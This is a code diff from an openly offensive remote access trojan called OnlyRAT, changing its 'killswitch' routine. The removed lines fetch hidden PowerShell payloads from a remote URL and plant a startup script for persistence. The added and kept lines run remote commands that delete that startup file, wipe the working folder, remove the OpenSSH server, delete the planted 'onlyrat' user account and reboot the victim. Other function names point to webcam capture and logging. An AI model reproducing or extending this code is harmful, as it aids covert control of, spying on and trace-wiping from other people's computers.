@@ -232,19 +232,13 @@ def grab_webcam(address, password, working, username):
 def killswitch(address, password, working, username):
     print("\n[*] Prepping killswitch...")
     # web requests
-    # killswitch_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/killswitch.ps1 -OutFile {working}/TOhjZsWluf.ps1\""
-    # killtask_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/killtask.ps1 -OutFile {working}/SaReWIdGnz.ps1\""
-    # controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/SaReWIdGnz.ps1 >> GiLqXiexKP.cmd"
-    killswitch_command = f"powershell /c Remove-Item \"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GiLqXiexKP.cmd\"; Remove-Item {working}/* -r -Force; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/onlyrat\" -r -Force; Remove-LocalUser -Name \"onlyrat\"; shutdown /r"
+    killswitch_command = f"powershell /c cd C:; Remove-Item {working}/* -r -Force; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/onlyrat\" -r -Force; Remove-LocalUser -Name \"onlyrat\"; shutdown /r"
     print("[+] Killswitch prepped")
 
     # installing killswitch
     print("[*] Executing killswitch...")
+    remote_command(address, password, f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && del GiLqXiexKP.cmd")
     remote_command(address, password, killswitch_command)
-    # print("[*] Installing scheduler...")
-    # remote_command(address, password, killtask_command)
-    # print("[*] Installing controller...")
-    # remote_command(address, password, controller_command)
     print("[+] Killswitch Executed sucessfully\n")
        
     # execute logger
